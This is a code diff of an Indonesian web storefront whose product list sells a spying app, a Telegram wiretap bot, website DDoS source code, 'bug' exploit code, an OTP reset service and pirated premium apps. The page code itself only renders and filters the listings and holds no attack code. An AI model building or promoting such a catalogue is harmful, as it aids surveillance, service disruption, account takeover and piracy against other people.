+                name: "APK SADAP", 
+                description: "Aplikasi sadap premium", 
+                price: "Rp 175.000", 
+                category: "apk",
+                icon: "fas fa-bug"
+            },
+            { 
+                id: 17, 
+                name: "UBOT SADAP TELEGRAM", 
+                description: "UBot untuk sadap Telegram", 
+                price: "Rp 190.000", 
+                category: "sc",
+                icon: "fab fa-telegram"
+            },
+            { 
+                id: 18, 
+                name: "SC DDOS WEB", 
+                description: "Source code DDOS website", 
+                price: "Rp 160.000", 
+                category: "sc",
+                icon: "fas fa-shield-alt"
+            },
+            { 
+                id: 19, 
+                name: "BASE SC", 
+                description: "Base source code lengkap", 
+                price: "Rp 120.000", 
+                category: "sc",
+                icon: "fas fa-file-code"
+            },
+            { 
+                id: 20, 
+                name: "SC BUG", 
+                description: "Source code bug terbaru", 
+                price: "Rp 140.000", 
+                category: "sc",
+                icon: "fas fa-bug"
+            },
+            { 
+                id: 21, 
+                name: "FUNC BUG", 
+                description: "Fungsi bug terkini", 
+                price: "Rp 130.000", 
+                category: "sc",
+                icon: "fas fa-code-branch"
+            },
+            { 
+                id: 22, 
+                name: "MURBAND CH", 
+                description: "Layanan MURBAND CH premium", 
+                price: "Rp 90.000", 
+                category: "murid",
+                icon: "fas fa-comments"
+            },
+            { 
+                id: 23, 
+                name: "MURID RESET OTP", 
+                description: "Layanan reset OTP profesional", 
+                price: "Rp 85.000", 
+                category: "murid",
+                icon: "fas fa-sync"
+            },
+            { 
+                id: 24, 
+                name: "APK JB", 
+                description: "Aplikasi JB terbaru", 
+                price: "Rp 110.000", 
+                category: "apk",
+                icon: "fas fa-tools"
+            },
+            { 
+                id: 25, 
+                name: "APK FF BETA", 
+                description: "Aplikasi FF Beta version", 
+                price: "Rp 95.000", 
+                category: "apk",
+                icon: "fas fa-gamepad"
+            },
+            { 
+                id: 26, 
+                name: "APK BIOSKOP", 
+                description: "Aplikasi bioskop premium", 
+                price: "Rp 80.000", 
+                category: "apk",
+                icon: "fas fa-film"
+            },
+            { 
+                id: 27, 
+                name: "APK SPOTIFY PREM", 
+                description: "Aplikasi Spotify premium", 
+                price: "Rp 75.000", 
+                category: "apk",
+                icon: "fab fa-spotify"
             }
+        ];
 
-    let ytPlayer;
-    let ytPlaying = false;
-
-    function toggleYouTube() {
-      if (!ytPlayer) return;
-      const btn = event.target;
-      if (!ytPlaying) {
-        ytPlayer.playVideo();
-        btn.innerText = "⏸️ Pause Music";
-      } else {
-        ytPlayer.pauseVideo();
-        btn.innerText = "🎵 Play Music";
-      }
-      ytPlaying = !ytPlaying;
-    }
-
-    function onYouTubeIframeAPIReady() {
-      ytPlayer = new YT.Player('ytPlayer');
-    }
-
-    const tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    const firstScriptTag = document.getElementsByTagName('script')[0];
-    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
-  </script>
-
+        // Fungsi untuk menampilkan produk
+        function displayProducts(category = 'all') {
+            const productsContainer = document.getElementById('products');
+            productsContainer.innerHTML = '';
+            
+            const filteredProducts = category === 'all' 
+                ? products 
+                : products.filter(product => product.category === category);
+            
+            filteredProducts.forEach(product => {
+                const productCard = document.createElement('div');
+                productCard.className = 'product-card';
+                
+                productCard.innerHTML = `
+                    <div class="product-image">
+                        <i class="${product.icon}"></i>
+                    </div>
+                    <div class="product-info">
+                        <h3>${product.name}</h3>
+                        <p>${product.description}</p>
+                        <div class="product-price">${product.price}</div>
+                        <button class="buy-btn">Beli Sekarang</button>
+                    </div>
+                `;
+                
+                productsContainer.appendChild(productCard);
+            });
+        }
+        
+        // Event listener untuk kategori
+        document.querySelectorAll('.category-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
+                this.classList.add('active');
+                
+                const category = this.getAttribute('data-category');
+                displayProducts(category);
+            });
+        });
+        
+        // Inisialisasi tampilan
+        document.addEventListener('DOMContentLoaded', function() {
+            displayProducts();
+            
+            // Smooth scroll untuk navigasi
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    const targetElement = document.querySelector(targetId);
+                    
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 100,
+                        behavior: 'smooth'
+                    });
+                });
+            });
+        });
+    </script>
 </body>
 </html>
